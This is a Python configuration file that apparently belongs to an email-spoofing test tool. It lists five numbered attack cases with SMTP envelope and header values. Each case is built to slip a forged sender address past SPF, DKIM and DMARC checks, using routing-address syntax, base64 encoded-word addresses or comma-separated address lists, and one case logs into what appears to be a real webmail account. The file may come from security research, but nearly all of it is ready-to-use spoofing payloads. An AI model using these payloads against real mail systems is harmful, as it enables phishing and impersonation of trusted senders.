"""
The attacker and spoofer domain is attack.com, which is bound to a server with its 25 port shutdown.
SPF and DKIM records are set in attack.com
The victim address is ruin@victim.com.
PLEASE DO NOT LEAK ANY INFORMATION IN THIS FILE!!
"""

import base64
param = {
    # 4.1 MAIL FROM confusion
    # SPF=none DKIM=pass DMARC=bestguesspass
    # A3 is the same method
    'A1' : {
        'helo': 'attack.com',
        'login': 0,
        
        'mailfrom': "<any@fakesubdomain.attack.com>",
        'receiver': '<ruin@victim.com>',

        'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},

        'mfrom': b'<admin@attack.com>',
        'subject': 'A1 attack',
        'body': 'Testing.'
    },
    # 4.3 Authentication results injection
    # This is a variation
    # Routing address in MAIL FROM
    # SPF=pass DKIM=pass DMARC=bestguesspass
    # While mfrom refers to another domain, DMARC will report fail
    # reason: compauth!
    'A5' : {
        'helo': 'attack.com',
        'login': 0,
        
        'mailfrom': "<@attack.com,@any.com:'any@attack.com>",
        'receiver': '<ruin@victim.com>',

        'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},

        'mfrom': b'<admin@attack.com>',
        'subject': 'A5 attack',
        'body': 'Testing.'
    },
    # 5.2 Ambiguous email addresses
    # A10: Email address encoding
    # SPF=pass DKIM=none DMARC=bestguesspass
    'A10' : {
        'helo': 'attack.com',
        'login': 0,
        'mailfrom': '<any@attack.com>',
        'receiver': '<ruin@victim.com>',

        # 'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
        'dkim_para': None,

        'mfrom': b'=?utf-8?B?'+base64.b64encode(b"admin@126.com")+ b'?='+b',<any@attack.com>',
        'subject': 'A10 attack',
        'body': 'Testing.'
    },
    # A13: Parsing inconsistencies
    # SPF=pass DKIM=none DMARC=bestguesspass
    'A13' : {
        'helo': 'attack.com',
        'login': 0,
        'mailfrom': '<any@attack.com>',
        'receiver': '<ruin@victim.com>',

        # 'dkim_para': {'d':b'attack.com', 's':b'selector', 'sign_header': b'From: <admin@attack.com>'},
        'dkim_para': None,

        'mfrom': b'admin@attack.com,<any@attack.com>',
        'subject': 'A13 attack',
        'body': 'Testing.'
    },
    # 6.2 Spoofing via an email service account
    # SPF=pass DKIM=pass DMARC=pass
   'A17': {
        'helo': '126.com',
        'login': 1,
        'sender': 'jiarun1234@126.com',
        'mailfrom': '<jiarun1234@126.com>',
        'receiver': '<ruin@victim.com>',

        'dkim_para': None,

        'mfrom': b'<admin@126.com>',
        'subject': 'A17 attack',
        'body': 'Testing.'        
    }

}
